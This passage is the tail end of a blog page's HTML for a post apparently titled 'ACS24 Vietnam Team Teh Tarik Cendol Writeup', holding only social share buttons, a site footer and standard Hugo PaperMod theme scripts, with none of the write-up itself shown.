-29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ACS24 Vietnam Team Teh Tarik Cendol Writeup on facebook"
            href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2facs24-team-writeup%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ACS24 Vietnam Team Teh Tarik Cendol Writeup on whatsapp"
            href="https://api.whatsapp.com/send?text=ACS24%20Vietnam%20Team%20Teh%20Tarik%20Cendol%20Writeup%20-%20http%3a%2f%2flocalhost%3a1313%2fposts%2facs24-team-writeup%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ACS24 Vietnam Team Teh Tarik Cendol Writeup on telegram"
            href="https://telegram.me/share/url?text=ACS24%20Vietnam%20Team%20Teh%20Tarik%20Cendol%20Writeup&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2facs24-team-writeup%2f">
            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                <path
                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ACS24 Vietnam Team Teh Tarik Cendol Writeup on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=ACS24%20Vietnam%20Team%20Teh%20Tarik%20Cendol%20Writeup&u=http%3a%2f%2flocalhost%3a1313%2fposts%2facs24-team-writeup%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">Irfan Haziq&#39;s Site</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
